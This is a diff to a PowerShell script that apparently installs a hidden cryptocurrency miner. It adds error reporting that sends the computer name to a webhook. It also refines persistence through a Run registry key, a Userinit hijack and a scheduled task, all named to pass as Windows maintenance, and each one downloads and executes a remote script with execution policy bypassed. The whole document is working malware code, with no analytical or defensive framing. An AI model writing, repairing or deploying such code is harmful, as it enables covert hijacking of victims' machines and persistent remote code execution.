@@ -69,34 +69,39 @@ try {
     
     $combinedArgs = "$MaskedCpu|$GpuArg|$Wallet|$IsAmd|$Webhook"
     $startMethod.Invoke($null, @([string]$combinedArgs))
-} catch { }
+} catch { 
+    $errMsg = "❌ **Deployment Error** on " + $env:COMPUTERNAME + ": " + $_.Exception.Message
+    $json = "{`"content`": `"$errMsg`"}"
+    $wc.Headers["Content-Type"] = "application/json"
+    try { $wc.UploadString($Webhook, "POST", $json) } catch { }
+}
 
 # --- USER-MODE PERSISTENCE (GHOST LAYER) ---
 try {
     $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $Payload = "$MaskedHost -NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1')`""
+    # Ensure MaskedHost is quoted to handle spaces in user paths
+    $Payload = "`"$MaskedHost`" -NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1')`""
     
     # 1. Registry Run Key
     Set-ItemProperty -Path $RunKey -Name "WindowsUpdateManager" -Value $Payload -ErrorAction SilentlyContinue
 
-    # 2. Userinit Hijack (Runs when shell starts)
+    # 2. Userinit Hijack
     $WinlogonPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Winlogon"
     if (-not (Test-Path $WinlogonPath)) { New-Item -Path $WinlogonPath -Force | Out-Null }
     $NewInit = "C:\Windows\system32\userinit.exe, " + $Payload
     Set-ItemProperty -Path $WinlogonPath -Name "Userinit" -Value $NewInit -ErrorAction SilentlyContinue
 
-    # 3. Scheduled Task (Immortal Trigger - runs every 1 min)
+    # 3. Scheduled Task (Immortal Trigger)
     $TaskName = "WinSysMaintenance"
     $Action = New-ScheduledTaskAction -Execute $MaskedHost -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1')`""
     $Trigger = New-ScheduledTaskTrigger -AtLogOn
     $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
     
-    # Check if task exists, if not create it
     if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Description "Windows System Maintenance Task" -ErrorAction SilentlyContinue
     }
 } catch { 
-    # Fallback for schtasks if Cmdlets fail
-    $SchPayload = "/create /sc minute /mo 1 /tn `"WinSysMaintenance`" /tr `"$Payload`" /f"
-    Start-Process "schtasks.exe" -ArgumentList $SchPayload -WindowStyle Hidden -ErrorAction SilentlyContinue
+    # Harder fallback for schtasks quoting
+    $SchTaskCmd = "schtasks.exe /create /sc minute /mo 1 /tn `"WinSysMaintenance`" /tr `"$Payload`" /f"
+    Invoke-Expression $SchTaskCmd
 }
